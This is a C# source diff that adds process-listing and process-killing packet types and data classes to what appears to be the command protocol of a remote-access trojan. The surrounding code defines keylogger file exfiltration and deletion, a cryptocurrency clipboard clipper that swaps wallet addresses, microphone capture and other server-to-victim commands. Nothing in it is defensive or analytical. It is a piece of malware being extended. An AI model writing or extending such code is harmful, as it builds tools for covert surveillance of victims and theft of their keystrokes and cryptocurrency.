@@ -104,6 +104,11 @@ public enum PacketType
     KeyloggerFileContent = 178,  // client→server: {Filename, Content}
     KeyloggerDeleteFile  = 179,  // server→client: {Filename}
 
+    // Process Manager
+    ProcGetList   = 190,  // server→client: request process list
+    ProcListResult = 191, // client→server: [{Pid, Name, Memory, Title, ExePath}]
+    ProcKill      = 192,  // server→client: {Pid}
+
     // Crypto Clipper
     ClipperSetConfig   = 180,  // server→client: {Enabled, Addresses:{BTC,ETH,...}}
     ClipperGetStats    = 181,  // server→client: request stats
@@ -340,6 +345,18 @@ public class MicDataPacket        { public string Data { get; set; } = string.Em
 // ── Fun ───────────────────────────────────────────────
 public class FunCmdData    { public string Action { get; set; } = string.Empty; public string Param { get; set; } = string.Empty; }
 public class FunResultData { public string Action { get; set; } = string.Empty; public string Result { get; set; } = string.Empty; }
+
+// ── Process Manager ──────────────────────────────────
+public class ProcEntry
+{
+    public int    Pid     { get; set; }
+    public string Name    { get; set; } = string.Empty;
+    public long   Memory  { get; set; }  // KB
+    public string Title   { get; set; } = string.Empty;
+    public string ExePath { get; set; } = string.Empty;
+}
+public class ProcListResultData { public List<ProcEntry> Processes { get; set; } = []; }
+public class ProcKillData       { public int Pid { get; set; } }
 
 // ── Keylogger ─────────────────────────────────────────
 public class KeyloggerLogsResultData
